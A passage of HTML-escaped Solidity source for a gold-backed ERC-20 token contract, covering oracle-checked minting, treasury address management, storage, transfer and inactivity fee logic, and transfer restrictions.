true;\n  &#125;\n  /**\n  * @dev Function to add a certain amount of backed tokens. This will first\n  * take any tokens from the _unbackedTreasury address and move them to the\n  * _backedTreasury. Any remaining tokens will actually be minted.\n  * This operation will fail if there is not a sufficient supply of locked gold\n  * as determined by the LockedGoldOracle\n  *\n  * @param value The amount of tokens to add to the backed treasury\n  * @return A boolean that indicates if the operation was successful.\n  */\n  function addBackedTokens(uint256 value) external onlyOwner returns (bool)\n  &#123;\n    uint256 unbackedBalance = _balances[_unbackedTreasury];\n    // Use oracle to check if there is actually enough gold\n    // in custody to validate this operation\n    uint256 lockedGrams =  LockedGoldOracle(_oracle).lockedGold();\n    // Should reject mint if it would make the total supply\n    // exceed the amount actually locked in vault\n    require(lockedGrams >= totalCirculation().add(value),\n            \"Insufficent grams locked in LockedGoldOracle to complete operation\");\n    // If we have sufficient balance, just move from the unbacked to backed\n    // treasury address\n    if (value &lt;= unbackedBalance) &#123;\n      _transfer(_unbackedTreasury, _backedTreasury, value);\n    &#125; else &#123;\n      if (unbackedBalance > 0) &#123;\n        // There is no sufficient balance, so we have to both transfer and mint new tokens\n        // Transfer the remaining unbacked treasury balance to backed treasury\n        _transfer(_unbackedTreasury, _backedTreasury, unbackedBalance);\n      &#125;\n      // And mint the remaining to the backed treasury\n      _mint(value.sub(unbackedBalance));\n    &#125;\n    emit AddBackedGold(value);\n    return true;\n  &#125;\n  /**\n  * @dev Manually pay storage fees on senders address. Exchanges may want to\n  * periodically call this function to pay owed storage fees. This is a\n  * cheaper option than 'send to self', which would also trigger paying\n  * storage fees\n  *\n  * @return A boolean that indicates if the operation was successful.\n  */\n  function payStorageFee() external returns (bool) &#123;\n    _updateActivity(msg.sender);\n    _payStorageFee(msg.sender);\n    return true;\n  &#125;\n  function setAccountInactive(address account) external onlyEnforcer returns (bool) &#123;\n    require(_shouldMarkInactive(account), \"Account not eligible to be marked inactive\");\n    _setInactive(account);\n  &#125;\n  /**\n  * @dev Contract allows the forcible collection of storage fees on an address\n  * if it is has been more than than 365 days since the last time storage fees\n  * were paid on this address.\n  *\n  * Alternatively inactive fees may also be collected periodically on a prorated\n  * basis if the account is currently marked as inactive.\n  *\n  * @param account The address to pay storage fees on\n  * @return A boolean that indicates if the operation was successful.\n  */\n  function forcePayFees(address account) external onlyEnforcer returns(bool) &#123;\n    require(account != address(0));\n    require(_balances[account] > 0,\n            \"Account has no balance, cannot force paying fees\");\n    // If account is inactive, pay inactive fees\n    if (isInactive(account)) &#123;\n      uint256 paid = _payInactiveFee(account);\n      require(paid > 0);\n    &#125; else if (_shouldMarkInactive(account)) &#123;\n      // If it meets inactive threshold, but hasn't been set yet, set it.\n      // This will also trigger automatic payment of owed storage fees\n      // before starting inactive fees\n      _setInactive(account);\n    &#125; else &#123;\n      // Otherwise just force paying owed storage fees, which can only\n      // be called if they are more than 365 days overdue\n      require(daysSincePaidStorageFee(account) >= YEAR,\n              \"Account has paid storage fees more recently than 365 days\");\n      uint256 paid = _payStorageFee(account);\n      require(paid > 0, \"No appreciable storage fees due, will refund gas\");\n    &#125;\n  &#125;\n  /**\n  * @dev Set the address that can force collecting fees from users\n  * @param enforcer The address to force collecting fees\n  * @return An bool representing successfully changing enforcer address\n  */\n  function setFeeEnforcer(address enforcer) external onlyOwner returns(bool) &#123;\n    require(enforcer != address(0));\n    _feeEnforcer = enforcer;\n    setFeeExempt(_feeEnforcer);\n    return true;\n  &#125;\n  /**\n  * @dev Set the address to collect fees\n  * @param newFeeAddress The address to collect storage and transfer fees\n  * @return An bool representing successfully changing fee address\n  */\n  function setFeeAddress(address newFeeAddress) external onlyOwner returns(bool) &#123;\n    require(newFeeAddress != address(0));\n    require(newFeeAddress != _unbackedTreasury,\n            \"Cannot set fee address to unbacked treasury\");\n    _feeAddress = newFeeAddress;\n    setFeeExempt(_feeAddress);\n    return true;\n  &#125;\n  /**\n  * @dev Set the address to deposit tokens when redeeming for physical locked bars.\n  * @param newRedeemAddress The address to redeem tokens for bars\n  * @return An bool representing successfully changing redeem address\n  */\n  function setRedeemAddress(address newRedeemAddress) external onlyOwner returns(bool) &#123;\n    require(newRedeemAddress != address(0));\n    require(newRedeemAddress != _unbackedTreasury,\n            \"Cannot set redeem address to unbacked treasury\");\n    _redeemAddress = newRedeemAddress;\n    setFeeExempt(_redeemAddress);\n    return true;\n  &#125;\n  /**\n  * @dev Set the address of backed treasury\n  * @param newBackedAddress The address of backed treasury\n  * @return An bool representing successfully changing backed address\n  */\n  function setBackedAddress(address newBackedAddress) external onlyOwner returns(bool) &#123;\n    require(newBackedAddress != address(0));\n    require(newBackedAddress != _unbackedTreasury,\n            \"Cannot set backed address to unbacked treasury\");\n    _backedTreasury = newBackedAddress;\n    setFeeExempt(_backedTreasury);\n    return true;\n  &#125;\n  /**\n  * @dev Set the address to unbacked treasury\n  * @param newUnbackedAddress The address of unbacked treasury\n  * @return An bool representing successfully changing unbacked address\n  */\n  function setUnbackedAddress(address newUnbackedAddress) external onlyOwner returns(bool) &#123;\n    require(newUnbackedAddress != address(0));\n    require(newUnbackedAddress != _backedTreasury,\n            \"Cannot set unbacked treasury to backed treasury\");\n    require(newUnbackedAddress != _feeAddress,\n            \"Cannot set unbacked treasury to fee address \");\n    require(newUnbackedAddress != _redeemAddress,\n            \"Cannot set unbacked treasury to fee address \");\n    _unbackedTreasury = newUnbackedAddress;\n    setFeeExempt(_unbackedTreasury);\n    return true;\n  &#125;\n  /**\n  * @dev Set the LockedGoldOracle address\n  * @param oracleAddress The address for oracle\n  * @return An bool representing successfully changing oracle address\n  */\n  function setOracleAddress(address oracleAddress) external onlyOwner returns(bool) &#123;\n    require(oracleAddress != address(0));\n    _oracle = oracleAddress;\n    return true;\n  &#125;\n  /**\n  * @dev Set the number of days before storage fees begin accruing.\n  * @param daysGracePeriod The global setting for the grace period before storage\n  * fees begin accruing. Note that calling this will not change the grace period\n  * for addresses already actively inside a grace period\n  */\n  function setStorageFeeGracePeriodDays(uint256 daysGracePeriod) external onlyOwner &#123;\n    _storageFeeGracePeriodDays = daysGracePeriod;\n  &#125;\n  /**\n  * @dev Set this account as being exempt from transfer fees. This may be used\n  * in special circumstance for cold storage addresses owed by Cache, exchanges, etc.\n  * @param account The account to exempt from transfer fees\n  */\n  function setTransferFeeExempt(address account) external onlyOwner &#123;\n    _transferFeeExempt[account] = true;\n  &#125;\n  /**\n  * @dev Set this account as being exempt from storage fees. This may be used\n  * in special circumstance for cold storage addresses owed by Cache, exchanges, etc.\n  * @param account The account to exempt from storage fees\n  */\n  function setStorageFeeExempt(address account) external onlyOwner &#123;\n    _storageFeeExempt[account] = true;\n  &#125;\n  /**\n  * @dev Set account is no longer exempt from all fees\n  * @param account The account to reactivate fees\n  */\n  function unsetFeeExempt(address account) external onlyOwner &#123;\n    _transferFeeExempt[account] = false;\n    _storageFeeExempt[account] = false;\n  &#125;\n  /**\n  * @dev Set a new transfer fee in basis points, must be less than or equal to 10 basis points\n  * @param fee The new transfer fee in basis points\n  */\n  function setTransferFeeBasisPoints(uint256 fee) external onlyOwner &#123;\n    require(fee &lt;= MAX_TRANSFER_FEE_BASIS_POINTS,\n            \"Transfer fee basis points must be an integer between 0 and 10\");\n    _transferFeeBasisPoints = fee;\n  &#125;\n  /**\n  * @dev Gets the balance of the specified address deducting owed fees and\n  * accounting for the maximum amount that could be sent including transfer fee\n  * @param owner The address to query the balance of.\n  * @return An uint256 representing the amount sendable by the passed address\n  * including transaction and storage fees\n  */\n  function balanceOf(address owner) external view returns (uint256) &#123;\n    return calcSendAllBalance(owner);\n  &#125;\n  /**\n  * @dev Gets the balance of the specified address not deducting owed fees.\n  * this returns the 'traditional' ERC-20 balance that represents the balance\n  * currently stored in contract storage.\n  * @param owner The address to query the balance of.\n  * @return An uint256 representing the amount stored in passed address\n  */\n  function balanceOfNoFees(address owner) external view returns (uint256) &#123;\n    return _balances[owner];\n  &#125;\n  /**\n  * @dev Total number of tokens in existence. This includes tokens\n  * in the unbacked treasury that are essentially unusable and not\n  * in circulation\n  * @return A uint256 representing the total number of minted tokens\n  */\n  function totalSupply() external view returns (uint256) &#123;\n    return _totalSupply;\n  &#125;\n  /**\n  * @dev Function to check the amount of tokens that an owner allowed to a spender.\n  * @param owner address The address which owns the funds.\n  * @param spender address The address which will spend the funds.\n  * @return A uint256 specifying the amount of tokens still available for the spender.\n  */\n  function allowance(address owner, address spender) external view returns (uint256) &#123;\n    return _allowances[owner][spender];\n  &#125;\n  /**\n  * @return address that can force paying overdue inactive fees\n  */\n  function feeEnforcer() external view returns(address) &#123;\n    return _feeEnforcer;\n  &#125;\n  /**\n   * @return address where fees are collected\n   */\n  function feeAddress() external view returns(address) &#123;\n    return _feeAddress;\n  &#125;\n  /**\n   * @return address for redeeming tokens for gold bars\n   */\n  function redeemAddress() external view returns(address) &#123;\n    return _redeemAddress;\n  &#125;\n  /**\n   * @return address for backed treasury\n   */\n  function backedTreasury() external view returns(address) &#123;\n    return _backedTreasury;\n  &#125;\n  /**\n  * @return address for unbacked treasury\n  */\n  function unbackedTreasury() external view returns(address) &#123;\n    return _unbackedTreasury;\n  &#125;\n  /**\n  * @return address for oracle contract\n  */\n  function oracleAddress() external view returns(address) &#123;\n    return _oracle;\n  &#125;\n  /**\n  * @return the current number of days and address is exempt\n  * from storage fees upon receiving tokens\n  */\n  function storageFeeGracePeriodDays() external view returns(uint256) &#123;\n    return _storageFeeGracePeriodDays;\n  &#125;\n  /**\n  * @return the current transfer fee in basis points [0-10]\n  */\n  function transferFeeBasisPoints() external view returns(uint256) &#123;\n    return _transferFeeBasisPoints;\n  &#125;\n  /**\n  * @dev Simulate the transfer from one address to another see final balances and associated fees\n  * @param from The address to transfer from.\n  * @param to The address to transfer to.\n  * @param value The amount to be transferred.\n  * @return See _simulateTransfer function\n  */\n  function simulateTransfer(address from, address to, uint256 value) external view returns (uint256[5] memory) &#123;\n    return _simulateTransfer(from, to, value);\n  &#125;\n  /**\n  * @dev Set this account as being exempt from all fees. This may be used\n  * in special circumstance for cold storage addresses owed by Cache, exchanges, etc.\n  * @param account The account to exempt from storage and transfer fees\n  */\n  function setFeeExempt(address account) public onlyOwner &#123;\n    _transferFeeExempt[account] = true;\n    _storageFeeExempt[account] = true;\n  &#125;\n  /**\n  * @dev Check if the address given is extempt from storage fees\n  * @param account The address to check\n  * @return A boolean if the address passed is exempt from storage fees\n  */\n  function isStorageFeeExempt(address account) public view returns(bool) &#123;\n    return _storageFeeExempt[account];\n  &#125;\n  /**\n  * @dev Check if the address given is extempt from transfer fees\n  * @param account The address to check\n  * @return A boolean if the address passed is exempt from transfer fees\n  */\n  function isTransferFeeExempt(address account) public view returns(bool) &#123;\n    return _transferFeeExempt[account];\n  &#125;\n  /**\n  * @dev Check if the address given is extempt from transfer fees\n  * @param account The address to check\n  * @return A boolean if the address passed is exempt from transfer fees\n  */\n  function isAllFeeExempt(address account) public view returns(bool) &#123;\n    return _transferFeeExempt[account] &amp;&amp; _storageFeeExempt[account];\n  &#125;\n  /**\n  * @dev Check if the address is considered inactive for not having transacted with\n  * the contract for INACTIVE_THRESHOLD_DAYS\n  * @param account The address to check\n  * @return A boolean if the address passed is considered inactive\n  */\n  function isInactive(address account) public view returns(bool) &#123;\n    return _inactiveFeePerYear[account] > 0;\n  &#125;\n  /**\n  * @dev Total number of tokens that are actually in circulation, which is\n  * total tokens excluding the unbacked treasury\n  * @return A uint256 representing the total number of tokens in circulation\n  */\n  function totalCirculation() public view returns (uint256) &#123;\n    return _totalSupply.sub(_balances[_unbackedTreasury]);\n  &#125;\n  /**\n  * @dev Get the number of days since the account last paid storage fees\n  * @param account The address to check\n  * @return A uint256 representing the number of days since storage fees where last paid\n  */\n  function daysSincePaidStorageFee(address account) public view returns(uint256) &#123;\n    if (isInactive(account) || _timeStorageFeePaid[account] == 0) &#123;\n      return 0;\n    &#125;\n    return block.timestamp.sub(_timeStorageFeePaid[account]).div(DAY);\n  &#125;\n  /**\n  * @dev Get the days since the account last sent a transaction to the contract (activity)\n  * @param account The address to check\n  * @return A uint256 representing the number of days since the address last had activity\n  * with the contract\n  */\n  function daysSinceActivity(address account) public view returns(uint256) &#123;\n    if (_timeLastActivity[account] == 0) &#123;\n      return 0;\n    &#125;\n    return block.timestamp.sub(_timeLastActivity[account]).div(DAY);\n  &#125;\n  /**\n  * @dev Returns the total number of fees owed on a particular address\n  * @param account The address to check\n  * @return The total storage and inactive fees owed on the address\n  */\n  function calcOwedFees(address account) public view returns(uint256) &#123;\n    return calcStorageFee(account).add(calcInactiveFee(account));\n  &#125;\n  /**\n   * @dev Calculate the current storage fee owed for a given address\n   * @param account The address to check\n   * @return A uint256 representing current storage fees for the address\n   */\n  function calcStorageFee(address account) public view returns(uint256) &#123;\n    // If an account is in an inactive state those fees take over and\n    // storage fees are effectively paused\n    uint256 balance = _balances[account];\n    if (isInactive(account) || isStorageFeeExempt(account) || balance == 0) &#123;\n      return 0;\n    &#125;\n    uint256 daysSinceStoragePaid = daysSincePaidStorageFee(account);\n    uint256 daysInactive = daysSinceActivity(account);\n    uint256 gracePeriod = _storageFeeGracePeriod[account];\n    // If there is a grace period, we can deduct it from the daysSinceStoragePaid\n    if (gracePeriod > 0) &#123;\n      if (daysSinceStoragePaid > gracePeriod) &#123;\n        daysSinceStoragePaid = daysSinceStoragePaid.sub(gracePeriod);\n      &#125; else &#123;\n        daysSinceStoragePaid = 0;\n      &#125;\n    &#125;\n    if (daysSinceStoragePaid == 0) &#123;\n      return 0;\n    &#125;\n    // This is an edge case where the account has not yet been marked inactive, but\n    // will be marked inactive whenever there is a transaction allowing it to be marked.\n    // Therefore we know storage fees will only be valid up to a point, and inactive\n    // fees will take over.\n    if (daysInactive >= INACTIVE_THRESHOLD_DAYS) &#123;\n      // This should not be at risk of being negative, because its impossible to force paying\n      // storage fees without also setting the account to inactive, so if we are here it means\n      // the last time storage fees were paid was BEFORE the account became eligible to be inactive\n      // and it's always the case that daysSinceStoragePaid > daysInactive.sub(INACTIVE_THRESHOLD_DAYS)\n      daysSinceStoragePaid = daysSinceStoragePaid.sub(daysInactive.sub(INACTIVE_THRESHOLD_DAYS));\n    &#125;\n    // The normal case with normal storage fees\n    return storageFee(balance, daysSinceStoragePaid);\n  &#125;\n  /**\n   * @dev Calculate the current inactive fee for a given address\n   * @param account The address to check\n   * @return A uint256 representing current inactive fees for the address\n   */\n  function calcInactiveFee(address account) public view returns(uint256) &#123;\n    uint256 balance = _balances[account];\n    uint256 daysInactive = daysSinceActivity(account);\n    // if the account is marked inactive already, can use the snapshot balance\n    if (isInactive(account)) &#123;\n      return _calcInactiveFee(balance,\n                          daysInactive,\n                          _inactiveFeePerYear[account],\n                          _inactiveFeePaid[account]);\n    &#125; else if (_shouldMarkInactive(account)) &#123;\n      // Account has not yet been marked inactive in contract, but the inactive fees will still be due.\n      // Just assume snapshotBalance will be current balance after fees\n      uint256 snapshotBalance = balance.sub(calcStorageFee(account));\n      return _calcInactiveFee(snapshotBalance,                          // current balance\n                              daysInactive,                             // number of days inactive\n                              _calcInactiveFeePerYear(snapshotBalance), // the inactive fee per year based on balance\n                              0);                                       // fees paid already\n    &#125;\n    return 0;\n  &#125;\n  /**\n   * @dev Calculate the amount that would clear the balance from the address\n   * accounting for owed storage and transfer fees\n   * accounting for storage and transfer fees\n   * @param account The address to check\n   * @return A uint256 representing total amount an address has available to send\n   */\n  function calcSendAllBalance(address account) public view returns (uint256) &#123;\n    require(account != address(0));\n    // Internal addresses pay no fees, so they can send their entire balance\n    uint256 balanceAfterStorage = _balances[account].sub(calcOwedFees(account));\n    if (_transferFeeBasisPoints == 0 || isTransferFeeExempt(account)) &#123;\n      return balanceAfterStorage;\n    &#125;\n    // Edge cases where remaining balance is 0.00000001, but is effectively 0\n    if (balanceAfterStorage &lt;= 1) &#123;\n      return 0;\n    &#125;\n    // Calculate the send all amount including storage fee\n    // Send All = Balance / 1.001\n    // and round up 0.00000001\n    uint256 divisor = TOKEN.add(_transferFeeBasisPoints.mul(BASIS_POINTS_MULTIPLIER));\n    uint256 sendAllAmount = balanceAfterStorage.mul(TOKEN).div(divisor).add(1);\n    // Calc transfer fee on send all amount\n    uint256 transFee = sendAllAmount.mul(_transferFeeBasisPoints).div(BASIS_POINTS_MULTIPLIER);\n    // Fix to include rounding errors\n    if (sendAllAmount.add(transFee) > balanceAfterStorage) &#123;\n      return sendAllAmount.sub(1);\n    &#125;\n    return sendAllAmount;\n  &#125;\n  /*\n   * @dev Calculate the transfer fee on an amount\n   * @param value The value being sent\n   * @return A uint256 representing the transfer fee on sending the value given\n   */\n  function calcTransferFee(address account, uint256 value) public view returns(uint256) &#123;\n    if (isTransferFeeExempt(account)) &#123;\n      return 0;\n    &#125;\n    // Basis points -> decimal multiplier:\n    // f(x) = x / 10,0000 (10 basis points is 0.001)\n    // So transfer fee working with integers =\n    // f(balance, basis) = (balance * TOKEN) / (10,000 * TOKEN / basis)\n    return value.mul(_transferFeeBasisPoints).div(BASIS_POINTS_MULTIPLIER);\n  &#125;\n  /*\n   * @dev Calculate the storage fee for a given balance after a certain number of\n   * days have passed since the last time fees were paid.\n   * @param balance The current balance of the address\n   * @param daysSinceStoragePaid The number days that have passed since fees where last paid\n   * @return A uint256 representing the storage fee owed\n   */\n  function storageFee(uint256 balance, uint256 daysSinceStoragePaid) public pure returns(uint256) &#123;\n    uint256 fee = balance.mul(TOKEN).mul(daysSinceStoragePaid).div(YEAR).div(STORAGE_FEE_DENOMINATOR);\n    if (fee > balance) &#123;\n      return balance;\n    &#125;\n    return fee;\n  &#125;\n  /**\n   * @dev Approve an address to spend another addresses' tokens.\n   * @param owner The address that owns the tokens.\n   * @param spender The address that will spend the tokens.\n   * @param value The number of tokens that can be spent.\n   */\n  function _approve(address owner, address spender, uint256 value) internal &#123;\n    require(spender != address(0));\n    require(owner != address(0));\n    _allowances[owner][spender] = value;\n    emit Approval(owner, spender, value);\n  &#125;\n  /**\n  * @dev Transfer token for a specified addresses. Transfer is modified from a\n  * standard ERC20 contract in that it must also process transfer and storage fees\n  * for the token itself. Additionally there are certain internal addresses that\n  * are not subject to fees.\n  * @param from The address to transfer from.\n  * @param to The address to transfer to.\n  * @param value The amount to be transferred.\n  */\n  function _transfer(address from, address to, uint256 value) internal &#123;\n    _transferRestrictions(to, from);\n    // If the account was previously inactive and initiated the transfer, the\n    // inactive fees and storage fees have already been paid by the time we get here\n    // via the _updateActivity() call\n    uint256 storageFeeFrom = calcStorageFee(from);\n    uint256 storageFeeTo = 0;\n    uint256 allFeeFrom = storageFeeFrom;\n    uint256 balanceFromBefore = _balances[from];\n    uint256 balanceToBefore = _balances[to];\n    // If not sending to self can pay storage and transfer fee\n    if (from != to) &#123;\n      // Need transfer fee and storage fee for receiver if not sending to self\n      allFeeFrom = allFeeFrom.add(calcTransferFee(from, value));\n      storageFeeTo = calcStorageFee(to);\n      _balances[from] = balanceFromBefore.sub(value).sub(allFeeFrom);\n      _balances[to] = balanceToBefore.add(value).sub(storageFeeTo);\n      _balances[_feeAddress] = _balances[_feeAddress].add(allFeeFrom).add(storageFeeTo);\n    &#125; else &#123;\n      // Only storage fee if sending to self\n      _balances[from] = balanceFromBefore.sub(storageFeeFrom);\n      _balances[_feeAddress] = _balances[_feeAddress].add(storageFeeFrom);\n    &#125;\n    // Regular Transfer\n    emit Transfer(from, to, value);\n    // Fee transfer on `from` address\n    if (allFeeFrom > 0) &#123;\n      emit Transfer(from, _feeAddress, allFeeFrom);\n      if (storageFeeFrom > 0) &#123;\n        _timeStorageFeePaid[from] = block.timestamp;\n        _endGracePeriod(from);\n      &#125;\n    &#125;\n    // If first time receiving coins, set the grace period\n    // and start the the activity clock and storage fee clock\n    if (_timeStorageFeePaid[to] == 0) &#123;\n      // We may change the grace period in the future so we want to\n      // preserve it per address so there is no retroactive deduction\n      _storageFeeGracePeriod[to] = _storageFeeGracePeriodDays;\n      _timeLastActivity[to] = block.timestamp;\n      _timeStorageFeePaid[to] = block.timestamp;\n    &#125;\n    // Fee transfer on `to` address\n    if (storageFeeTo > 0) &#123;\n      emit Transfer(to, _feeAddress, storageFeeTo);\n      _timeStorageFeePaid[to] = block.timestamp;\n      _endGracePeriod(to);\n    &#125; else if (balanceToBefore &lt; MIN_BALANCE_FOR_FEES) &#123;\n      // MIN_BALANCE_FOR_FEES is the minimum amount in which a storage fee\n      // would be due after a sigle day, so if the balance is above that,\n      // the storage fee would always be greater than 0.\n      //\n      // This avoids the following condition:\n      // 1. User receives tokens\n      // 2. Users sends all but a tiny amount to another address\n      // 3. A year later, the user receives more tokens. Because\n      // their previous balance was super small, there were no appreciable\n      // storage fee, therefore the storage fee clock was not reset\n      // 4. User now owes storage fees on entire balance, as if they\n      // held tokens for 1 year, instead of resetting the clock to now.\n      _timeStorageFeePaid[to] = block.timestamp;\n    &#125;\n    // If transferring to unbacked treasury, tokens are being taken from\n    // circulation, because gold is being 'unlocked' from the vault\n    if (to == _unbackedTreasury) &#123;\n      emit RemoveGold(value);\n    &#125;\n  &#125;\n  /**\n  * @dev Function to mint tokens to backed treasury. In general this method\n  * will not be called on it's own, but instead will be called from\n  * addBackedTokens.\n  * @param value The amount of tokens to mint to backed treasury\n  * @return A boolean that indicates if the operation was successful.\n  */\n  function _mint(uint256 value) internal returns(bool) &#123;\n    // Can't break supply cap\n    require(_totalSupply.add(value) &lt;= SUPPLY_CAP, \"Call would exceed supply cap\");\n    // Can only mint if the unbacked treasury balance is 0\n    require(_balances[_unbackedTreasury] == 0, \"The unbacked treasury balance is not 0\");\n    // Can only mint to the backed treasury\n    _totalSupply = _totalSupply.add(value);\n    _balances[_backedTreasury] = _balances[_backedTreasury].add(value);\n    emit Transfer(address(0), _backedTreasury, value);\n    return true;\n  &#125;\n  /**\n   * @dev Apply storage fee deduction\n   * @param account The account to pay storage fees\n   * @return A uint256 representing the storage fee paid\n   */\n  function _payStorageFee(address account) internal returns(uint256) &#123;\n    uint256 storeFee = calcStorageFee(account);\n    if (storeFee == 0) &#123;\n      return 0;\n    &#125;\n    // Reduce account balance and add to fee address\n    _balances[account] = _balances[account].sub(storeFee);\n    _balances[_feeAddress] = _balances[_feeAddress].add(storeFee);\n    emit Transfer(account, _feeAddress, storeFee);\n    _timeStorageFeePaid[account] = block.timestamp;\n    _endGracePeriod(account);\n    return storeFee;\n  &#125;\n  /**\n   * @dev Apply inactive fee deduction\n   * @param account The account to pay inactive fees\n   * @return A uint256 representing the inactive fee paid\n   */\n  function _payInactiveFee(address account) internal returns(uint256) &#123;\n    uint256 fee = _calcInactiveFee(\n        _balances[account],\n        daysSinceActivity(account),\n        _inactiveFeePerYear[account],\n        _inactiveFeePaid[account]);\n    if (fee == 0) &#123;\n      return 0;\n    &#125;\n    _balances[account] = _balances[account].sub(fee);\n    _balances[_feeAddress] = _balances[_feeAddress].add(fee);\n    _inactiveFeePaid[account] = _inactiveFeePaid[account].add(fee);\n    emit Transfer(account, _feeAddress, fee);\n    return fee;\n  &#125;\n  function _shouldMarkInactive(address account) internal view returns(bool) &#123;\n    // Can only mark an account as inactive if\n    //\n    // 1. it's not fee exempt\n    // 2. it has a balance\n    // 3. it's been over INACTIVE_THRESHOLD_DAYS since last activity\n    // 4. it's not already marked inactive\n    // 5. the storage fees owed already consume entire balance\n    if (account != address(0) &amp;&amp;\n        _balances[account] > 0 &amp;&amp;\n        daysSinceActivity(account) >= INACTIVE_THRESHOLD_DAYS &amp;&amp;\n        !isInactive(account) &amp;&amp;\n        !isAllFeeExempt(account) &amp;&amp;\n        _balances[account].sub(calcStorageFee(account)) > 0) &#123;\n      return true;\n    &#125;\n    return false;\n  &#125;\n  /**\n  * @dev Mark an account as inactive. The function will automatically deduct\n  * owed storage fees and inactive fees in one go.\n  *\n  * @param account The account to mark inactive\n  */\n  function _setInactive(address account) internal &#123;\n    // First get owed storage fees\n    uint256 storeFee = calcStorageFee(account);\n    uint256 snapshotBalance = _balances[account].sub(storeFee);\n    // all _setInactive calls are wrapped in _shouldMarkInactive, which\n    // already checks this, so we shouldn't hit this condition\n    assert(snapshotBalance > 0);\n    // Set the account inactive on deducted balance\n    _inactiveFeePerYear[account] = _calcInactiveFeePerYear(snapshotBalance);\n    emit AccountInactive(account, _inactiveFeePerYear[account]);\n    uint256 inactiveFees = _calcInactiveFee(snapshotBalance,\n                                            daysSinceActivity(account),\n                                            _inactiveFeePerYear[account],\n                                            0);\n    // Deduct owed storage and inactive fees\n    uint256 fees = storeFee.add(inactiveFees);\n    _balances[account] = _balances[account].sub(fees);\n    _balances[_feeAddress] = _balances[_feeAddress].add(fees);\n    _inactiveFeePaid[account] = _inactiveFeePaid[account].add(inactiveFees);\n    emit Transfer(account, _feeAddress, fees);\n    // Reset storage fee clock if storage fees paid\n    if (storeFee > 0) &#123;\n      _timeStorageFeePaid[account] = block.timestamp;\n      _endGracePeriod(account);\n    &#125;\n  &#125;\n  /**\n  * @dev Update the activity clock on an account thats originated a transaction.\n  * If the account has previously been marked inactive or should have been\n  * marked inactive, it will opportunistically collect those owed fees.\n  *\n  * @param account The account to update activity\n  */\n  function _updateActivity(address account) internal &#123;\n    // Cache has the ability to force collecting storage and inactivity fees,\n    // but in the event an address was missed, can we still detect if the\n    // account was inactive when they next transact\n    //\n    // Here we simply set the account as being inactive, collect the previous\n    // storage and inactive fees that were owed, and then reactivate the account\n    if (_shouldMarkInactive(account)) &#123;\n      // Call will pay existing storage fees before marking inactive\n      _setInactive(account);\n    &#125;\n    // Pay remaining fees and reset fee clocks\n    if (isInactive(account)) &#123;\n      _payInactiveFee(account);\n      _inactiveFeePerYear[account] = 0;\n      _timeStorageFeePaid[account] = block.timestamp;\n      emit AccountReActive(account);\n    &#125;\n    // The normal case will just hit this and update\n    // the activity clock for the account\n    _timeLastActivity[account] = block.timestamp;\n  &#125;\n  /**\n   * @dev Turn off storage fee grace period for an address the first\n   * time storage fees are paid (after grace period has ended)\n   * @param account The account to turn off storage fee grace period\n   */\n  function _endGracePeriod(address account) internal &#123;\n    if (_storageFeeGracePeriod[account] > 0) &#123;\n      _storageFeeGracePeriod[account] = 0;\n    &#125;\n  &#125;\n  /**\n  * @dev Enforce the rules of which addresses can transfer to others\n  * @param to The sending address\n  * @param from The receiving address\n  */\n  function _transferRestrictions(address to, address from) internal view &#123;\n    require(from != address(0));\n    require(to != address(0));\n    require(to != address(this), \"Cannot transfer tokens to the contract\");\n    // unbacked treasury can only transfer to backed treasury\n    if (from == _unbackedTreasury) &#123;\n      require(to == _backedTreasury,\n              \"Unbacked treasury can only transfer to backed treasury\");\n    &#125;\n    // redeem address can only transfer to unbacked or backed treasury\n    if (from == _redeemAddress) &#123;\n      require((to == _unbackedTreasury) || (to == _backedTreasury),\n              \"Redeem address can only transfer to treasury\");\n    &#125;\n    // Only the backed treasury  and redeem address\n    // can transfer to unbacked treasury\n    if (to == _unbackedTreasury) &#123;\n      require((from == _backedTreasury) || (from == _redeemAddress),\n              \"Unbacked treasury can only receive from redeem address and backed treasury\");\n    &#125;\n    // Only the unbacked treasury can transfer to the backed treasury\n    if (to == _backedTreasury) &#123;\n      require((from == _unbackedTreasury) || (from == _redeemAddress),\n              \"Only unbacked treasury and redeem address can transfer to backed treasury\");\n    &#125;\n  &#125;\n  /**\n   * @dev Simulate the transfer from one address to another see final balances and associated fees\n   * @param from address The address which you want to send tokens from\n   * @param to address The address which you want to transfer to\n   * @return a uint256 array of 5 values representing the\n   * [0] storage fees `from`\n   * [1] storage fees `to`\n   * [2] transfer fee `from`\n   * [3] final `from` balance\n   * [4] final `to` balance\n   */\n  function _simulateTransfer(address from, address to, uint256 value) internal view returns (uint256[5] memory) &#123;\n    uint256[5] memory ret;\n    // Return value slots\n    // 0 - fees `from`\n    // 1 - fees `to`\n    // 2 - transfer fee `from`\n    // 3 - final `from` balance\n    // 4 - final `to` balance\n    ret[0] = calcOwedFees(from);\n    ret[1] = 0;\n    ret[2] = 0;\n    // Don't double charge storage fee sending to self\n    if (from != to) &#123;\n      ret[1] = calcOwedFees(to);\n      ret[2] = calcTransferFee(from, value);\n      ret[3] = _balances[from].sub(value).sub(ret[0]).sub(ret[2]);\n      ret[4] = _balances[to].add(value).sub(ret[1]);\n    &#125; else &#123;\n      ret[3] = _balances[from].sub(ret[0]);\n      ret[4] = ret[3];\n    &#125;\n    return ret;\n  &#125;\n  /**\n  * @dev Calculate the amount of inactive fees due per year on the snapshot balance.\n  * Should return 50 basis points or 1 token minimum.\n  *\n  * @param snapshotBalance The balance of the account when marked inactive\n  * @return uint256 the inactive fees due each year\n  */\n  function _calcInactiveFeePerYear(uint256 snapshotBalance) internal pure returns(uint256) &#123;\n    uint256 inactiveFeePerYear = snapshotBalance.mul(TOKEN).div(INACTIVE_FEE_DENOMINATOR);\n    if (inactiveFeePerYear &lt; TOKEN) &#123;\n      return TOKEN;\n    &#125;\n    return inactiveFeePerYear;\n  &#125;\n  /**\n  * @dev Calcuate inactive fees due on an account\n  * @param balance The current account balance\n  * @param daysInactive The number of days the account has been inactive\n  * @param feePerYear The inactive fee per year based on snapshot balance\n  * @param paidAlready The amount of inactive fees that have been paid already\n  * @return uint256 for inactive fees due\n  */\n  function _calcInactiveFee(uint256 balance,\n                        uint256 daysInactive,\n                        uint256 feePerYear,\n                        uint256 paidAlready) internal pure returns(uint256) &#123;\n    uint256 daysDue = daysInactive.sub(INACTIVE_THRESHOLD_DAYS);\n    uint256 totalDue = feePerYear.mul(TOKEN).mul(daysDue).div(YEAR).div(TOKEN).sub(paidAlready);\n    // The fee per year can be off by 0.00000001 so we can collect\n    // the final dust after 200 years\n    if (totalDue > balance || balance.sub(totalDue) &lt;= 200) &#123;\n      return balance;\n    &#125;\n    return totalDue;\n 